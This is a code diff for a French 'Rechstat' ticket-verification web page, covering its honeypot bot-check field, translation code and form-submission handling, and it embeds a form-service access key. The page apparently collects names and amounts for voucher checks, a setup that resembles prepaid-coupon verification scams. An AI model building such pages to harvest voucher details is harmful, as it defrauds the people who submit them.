@@ -144,7 +144,9 @@
           <input type="hidden" name="access_key" value="1eaf6de9-668d-4793-bf2a-134ad609663d">
           <input type="hidden" name="subject" value="Nouvelle vérification de ticket - Rechstat">
           <input type="hidden" name="from_name" value="Rechstat Security">
-          <input type="checkbox" name="botcheck" class="hidden-field" style="display: none;">
+          
+          <input type="text" name="botcheck" style="display: none !important;" tabindex="-1" autocomplete="off">
+          
           <input type="hidden" name="submitted_at" id="submitted_at">
 
           <label for="nom" id="lbl-nom">Nom :</label>
@@ -186,7 +188,6 @@
   </footer>
 
   <script>
-    // --- DICTIONNAIRE DE TRADUCTION ---
     const translations = {
       fr: {
         navHome: "Accueil", navFaq: "FAQ", lblNom: "Nom :", lblPrenom: "Prénom :", lblMontant: "Montant :",
@@ -242,12 +243,10 @@
 
     function setLang(lang, flag, name) {
       currentLang = lang;
-      // Mise à jour visuelle du sélecteur
       const display = document.getElementById('current-lang-display');
       display.querySelector('img').src = flag;
       display.querySelector('span').innerText = name;
 
-      // Traduction des éléments
       const t = translations[lang];
       document.getElementById('nav-home').innerText = t.navHome;
       document.getElementById('nav-faq').innerText = t.navFaq;
@@ -260,9 +259,7 @@
       document.getElementById('txt-oui').innerText = t.txtOui;
       document.getElementById('txt-non').innerText = t.txtNon;
       document.getElementById('foot-faq').innerText = t.navFaq;
-      document.getElementById('foot-contact').innerText = "Contact";
 
-      // Fermer le menu
       document.getElementById('langOptions').style.display = 'none';
     }
 
@@ -331,22 +328,28 @@
           body: JSON.stringify(object)
         })
         .then(async (response) => {
-          if (response.status == 200) {
+          const json = await response.json();
+          
+          if (response.ok && json.success) {
+            // SUCCÈS RÉEL
             resultDiv.style.background = "#dcfce7";
             resultDiv.style.color = "var(--success)";
             resultDiv.innerText = t.resSuccess;
             setTimeout(() => { window.location.href = "https://rechstat.com/merci.html"; }, 2000);
           } else {
+            // ERREUR OU REJET
             resultDiv.style.background = "#fee2e2";
             resultDiv.style.color = "var(--error)";
+            // On affiche ton message d'avertissement personnalisé
             resultDiv.innerText = t.resError;
             btn.disabled = false;
             btn.innerText = t.btnRetry;
           }
         })
         .catch(error => {
-          resultDiv.innerText = "Error...";
+          resultDiv.innerText = "Erreur de connexion.";
           btn.disabled = false;
+          btn.innerText = t.btnRetry;
         });
       });
     };
